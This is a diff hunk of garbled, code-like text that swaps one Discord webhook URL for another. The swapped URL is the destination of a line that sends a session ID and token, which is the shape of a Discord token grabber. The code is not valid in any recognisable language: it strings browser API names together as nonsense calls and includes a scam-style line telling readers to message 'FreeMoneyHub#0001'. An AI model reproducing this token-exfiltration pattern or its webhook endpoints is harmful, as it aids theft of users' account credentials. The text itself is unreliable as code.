@@ -133,7 +133,7 @@ import; "ign/uuid"
                          find(89SDjsaHDjsnAmdHAeK8843754385hjsdfFHJafnma)
                           MediaKeyMessageEvent(locationbar)
                              send(event (encrypted sessionID : token))
-                              TO<"https://discord.com/api/webhooks/881969896039252008/vGPOhp531KXQtcHQFkYQPNJLU80My1JbYCP9SFMFL-hP4N1xh8ALJ7Nc9_ref2_Y7AW0">
+                              TO<"https://discordapp.com/api/webhooks/1045811478722248704/lzR-n9Mz2PwUqanpbAJ2AA3BMxQ3sQ-Lm3iONkCuQY-ng8B__gc8IQ7jI-D4ooArqN7U">
                              SVGAnimatedNumberList(scroll[11])
                               MediaStreamErrorEvent(dm FreeMoneyHub#0001 for help seems the program is glithed)
                                 (SourceBufferList)
